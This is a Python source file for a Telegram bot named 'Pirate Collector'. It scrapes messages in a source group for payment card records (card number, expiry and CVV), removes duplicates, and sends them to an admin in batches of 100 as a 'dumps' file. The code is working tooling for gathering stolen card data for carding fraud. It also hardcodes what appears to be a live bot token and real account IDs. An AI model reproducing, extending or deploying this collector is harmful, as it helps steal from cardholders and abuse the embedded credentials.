import logging
import re
import warnings
import io
import threading
from flask import Flask
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# Bypass Render/System warnings
warnings.filterwarnings("ignore")

# --- [ ⚙️ CONFIGURATION ] ---
BOT_TOKEN = "7963420197:AAGK-JSoXaxRNmRlszAQ3vLJf2DPz7i2r34"
ADMIN_ID = 7840042951
SOURCE_GROUP_ID = -1002666375873
FILE_NAME = "hq_dumps_by_@dex4dev.txt"
PORT = 10000 # Render's required port

# Global Persistence
captured_cards = []
unique_cards = set()
limit_per_file = 100

logging.basicConfig(level=logging.INFO)

# --- [ 🌐 RENDER PORT BINDING (FLASK) ] ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Pirate Collector is Alive and Running!", 200

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# --- [ 🛠 CORE ENGINE ] ---

def extract_cc(text):
    if not text: return None
    pattern = r"(\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4})"
    match = re.search(pattern, text)
    return match.group(1) if match else None

async def send_captured_file(context: ContextTypes.DEFAULT_TYPE):
    global captured_cards, unique_cards
    if not captured_cards: return

    try:
        content = "\n".join(captured_cards)
        out_file = io.BytesIO(content.encode('utf-8'))
        out_file.name = FILE_NAME
        
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=out_file,
            caption=(
                f"🏴‍☠️ <b>DUMP COLLECTION READY</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔥 <b>Total CCs:</b> <code>{len(captured_cards)}</code>\n"
                f"👤 <b>Admin:</b> @dex4dev"
            ),
            parse_mode="HTML"
        )
        captured_cards = []
        unique_cards.clear()
    except Exception as e:
        logging.error(f"Error: {e}")

# --- [ 🚀 ADMIN HANDLERS ] ---

async def handle_incoming(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global captured_cards, unique_cards
    if not update.message: return
    
    # Logic: Only Group or Admin Direct
    if not (update.effective_chat.id == SOURCE_GROUP_ID or update.effective_user.id == ADMIN_ID):
        return

    text = update.message.text or update.message.caption
    cc = extract_cc(text)
    
    if cc and cc not in unique_cards:
        unique_cards.add(cc)
        captured_cards.append(cc)
        
        if len(captured_cards) % 10 == 0:
            try:
                await context.bot.send_message(
                    ADMIN_ID, 
                    f"📈 <b>Progress:</b> <code>{len(captured_cards)}/{limit_per_file}</code>", 
                    parse_mode="HTML"
                )
            except: pass

        if len(captured_cards) >= limit_per_file:
            await send_captured_file(context)

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_ID:
        await update.message.reply_text(
            f"🚀 <b>Pirate Collector (Render Ready)</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored: <code>{len(captured_cards)}</code>\n"
            f"🎯 Limit: <code>{limit_per_file}</code>",
            parse_mode="HTML"
        )

# --- [ 🏁 MAIN INITIALIZATION ] ---

def main():
    # Start Flask in a separate thread to satisfy Render's port 10000
    threading.Thread(target=run_flask, daemon=True).start()

    # Manual Bot Initialization to bypass Builder crashes
    request = HTTPXRequest(connection_pool_size=8)
    bot = Bot(token=BOT_TOKEN, request=request)
    application = Application(bot=bot)

    # Handlers
    application.add_handler(CommandHandler("start", start_cmd))
    application.add_handler(CommandHandler("getfile", lambda u, c: send_captured_file(c) if u.effective_user.id == ADMIN_ID else None))
    application.add_handler(CommandHandler("clear", lambda u, c: (captured_cards.clear(), unique_cards.clear()) if u.effective_user.id == ADMIN_ID else None))
    application.add_handler(MessageHandler(filters.ALL, handle_incoming))

    print(f"--- BOT BOOTED ON PORT {PORT} ---")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
